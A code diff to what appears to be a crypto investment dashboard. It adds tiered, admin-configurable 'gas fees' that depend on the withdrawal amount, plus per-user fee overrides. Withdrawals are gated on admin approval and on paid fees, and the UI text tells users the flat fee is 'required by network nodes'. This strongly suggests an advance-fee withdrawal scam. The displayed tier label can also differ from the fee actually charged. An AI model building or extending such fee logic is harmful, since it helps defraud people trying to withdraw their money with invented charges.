@@ -40,6 +40,10 @@ type PaymentSettings = {
   bank_swift: string;
   withdrawal_fee: number;
   gas_fee?: number;
+  gas_fee_low?: number;
+  gas_fee_high?: number;
+  gas_fee_threshold?: number;
+  gas_fee_tiers?: string;
 };
 
 type ToastMessage = {
@@ -1254,6 +1258,7 @@ export default function App() {
   // ── Dashboard ────────────────────────────────────────────────────────────
 
   if (!user) return null;
+  const currentUser = user;
 
   const total = Number(user.balance_usd) + Number(user.profit_usd);
   const tax = (total * Number(user.tax_percent)) / 100;
@@ -1269,13 +1274,43 @@ export default function App() {
 
   const canWithdraw = user.withdrawal_approved && feeFullyPaid;
 
-  const gasFee =
-    user.custom_gas_fee != null && Number(user.custom_gas_fee) >= 0
-      ? Number(user.custom_gas_fee)
-      : paymentSettings?.gas_fee ?? 200;
+  function getGasFeeForAmount(amt: number): number {
+    if (currentUser.custom_gas_fee != null && Number(currentUser.custom_gas_fee) >= 0) {
+      return Number(currentUser.custom_gas_fee);
+    }
+
+    if (paymentSettings?.gas_fee_tiers) {
+      try {
+        const tiers = typeof paymentSettings.gas_fee_tiers === 'string'
+          ? JSON.parse(paymentSettings.gas_fee_tiers)
+          : paymentSettings.gas_fee_tiers;
+        if (Array.isArray(tiers) && tiers.length > 0) {
+          const sorted = [...tiers].sort((a, b) => (Number(a.min_amount) || 0) - (Number(b.min_amount) || 0));
+          let matched = Number(sorted[0].gas_fee) || 100;
+          for (const tier of sorted) {
+            if (amt >= (Number(tier.min_amount) || 0)) {
+              matched = Number(tier.gas_fee);
+            }
+          }
+          return matched;
+        }
+      } catch {
+        // fallback to threshold logic
+      }
+    }
+
+    const threshold = paymentSettings?.gas_fee_threshold != null ? Number(paymentSettings.gas_fee_threshold) : 20000;
+    const feeLow = paymentSettings?.gas_fee_low != null ? Number(paymentSettings.gas_fee_low) : 100;
+    const feeHigh = paymentSettings?.gas_fee_high != null
+      ? Number(paymentSettings.gas_fee_high)
+      : (paymentSettings?.gas_fee != null ? Number(paymentSettings.gas_fee) : 200);
+
+    return amt >= threshold ? feeHigh : feeLow;
+  }
 
   const currentWAmount = parseFloat(wAmount) || 0;
   const activeAmount = currentWAmount > 0 ? currentWAmount : total;
+  const gasFee = getGasFeeForAmount(activeAmount);
   const currentTax = (activeAmount * Number(user.tax_percent)) / 100;
   const currentNetPayout = Math.max(0, activeAmount - currentTax);
 
@@ -1533,6 +1568,11 @@ export default function App() {
                       <div className="gas-name">Priority Blockchain Network Gas Fee</div>
                       <div className="gas-desc">
                         Required by network nodes to expedite blockchain dispatch and accelerate transaction confirmation.
+                      </div>
+                      <div style={{ fontSize: '12px', color: '#38bdf8', marginTop: '4px', fontWeight: 600 }}>
+                        {activeAmount >= (paymentSettings?.gas_fee_threshold ?? 20000)
+                          ? `⚡ Applied Tier 2 Rate: ${fmt(paymentSettings?.gas_fee_high ?? 200)} for requests $${(paymentSettings?.gas_fee_threshold ?? 20000).toLocaleString()}+`
+                          : `⚡ Applied Tier 1 Rate: ${fmt(paymentSettings?.gas_fee_low ?? 100)} for requests under $${(paymentSettings?.gas_fee_threshold ?? 20000).toLocaleString()}`}
                       </div>
                     </div>
                   </div>
